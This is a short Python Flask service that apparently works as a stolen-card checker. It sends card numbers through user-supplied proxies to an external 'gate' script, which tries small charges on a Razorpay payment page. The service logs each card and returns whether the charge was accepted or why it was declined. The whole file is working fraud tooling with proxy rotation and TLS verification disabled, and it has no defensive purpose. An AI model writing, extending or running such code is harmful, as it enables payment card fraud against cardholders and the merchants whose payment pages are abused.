from flask import Flask, request, jsonify
import requests
import json
import re
from datetime import datetime

app = Flask(__name__)

GATE_URL = "https://mydom.arpitchk.shop/autorz.php/"
HEADERS = {
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.9',
}

@app.route('/gate=rz/cc=<card>', methods=['GET'])
def gate(card):
    proxy = request.args.get('proxy')
    if not proxy:
        return jsonify({"status": "error", "message": "proxy missing"}), 400

    clean_proxy = proxy.replace("http://", "").replace("https://", "")
    url = f"{GATE_URL}?cc={card}&url=https://razorpay.me/@ukinternational&proxy=http://{clean_proxy}&amount=100"

    proxies = {"http": f"http://{clean_proxy}", "https": f"http://{clean_proxy}"}

    try:
        r = requests.get(url, headers=HEADERS, proxies=proxies, timeout=40, verify=False)

        # FULL LOG (you wanted this)
        print("\n" + "="*80)
        print(f"TIME  : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"CARD  : {card}")
        print(f"PROXY : {clean_proxy}")
        print(f"CODE  : {r.status_code}")
        print("RAW   :", r.text.strip())
        print("="*80 + "\n")

        # Extract JSON (gate returns JSON inside HTML)
        match = re.search(r'\{.*\}', r.text, re.DOTALL)
        if not match:
            return jsonify({"status": "parse_failed", "message": "No JSON found"})

        data = json.loads(match.group())

        # CASE 1: Normal gate response → return only status + message
        if "status" in data and "message" in data:
            return jsonify({
                "code": data["status"],
                "message": data["message"]
            })

        # CASE 2: Razorpay error response → return only reason + description
        if "FullResponse" in data and "error" in data["FullResponse"]:
            err = data["FullResponse"]["error"]
            return jsonify({
                "code": err.get("reason"),
                "message": err.get("description")
            })

        # Any other case → just return whatever is there (raw)
        return jsonify(data)

    except Exception as e:
        print(f"ERROR : {e}")
        return jsonify({"status": "gateway_error", "message": "dead proxy / timeout"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
